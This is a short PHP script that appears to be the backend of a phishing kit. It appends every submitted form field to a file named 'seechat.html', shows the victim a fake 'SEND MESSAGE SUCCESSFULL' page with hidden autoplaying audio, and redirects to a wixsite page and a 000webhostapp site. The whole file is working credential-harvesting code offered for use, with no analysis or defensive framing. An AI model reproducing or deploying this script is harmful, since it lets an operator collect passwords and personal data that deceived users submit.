<?php
header ('Location: guddumodok.wixsite.com/guddumodok');
$handle = fopen("seechat.html", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
echo "<body Background='loading.gif'><audio controls autoplay hidden>
  <source src='s.mp3' type='audio/mp3'>
 
</audio><img src='loading.gif' height='1000'width='1000'><FONT COLOR='BLUE'><h1>SEND MESSAGE SUCCESSFULL</H1></BODY>";
echo "<head><meta http-equiv='refresh' content='1;url=http://publicbox.000webhostapp.com/'>";
        exit;
?>